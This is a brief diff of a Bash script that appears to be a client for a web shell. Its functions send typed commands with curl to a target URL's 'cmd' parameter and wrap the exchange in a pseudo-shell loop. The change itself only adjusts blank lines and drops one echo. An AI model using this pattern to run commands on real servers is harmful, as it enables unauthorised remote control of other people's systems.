@@ -31,6 +31,7 @@ function makeRequest(){
 	echo -ne "${green}"
 	curl "$url?cmd=$1"
 	echo -ne "${end}"
+	
 }
 
 function getShell(){
@@ -54,12 +55,12 @@ function getShell(){
 		if [ $counter -eq 1 ]; then
 			command=$(echo $command | tr ' ' '+')
 			makeRequest $command
-			echo $command
 		else
 			echo -e "${red}Comando $(echo $command | awk '{print $1}') no encontrado${end}"
 		fi
  	done
 }
+
 declare -i parameter_counter=0
 
 
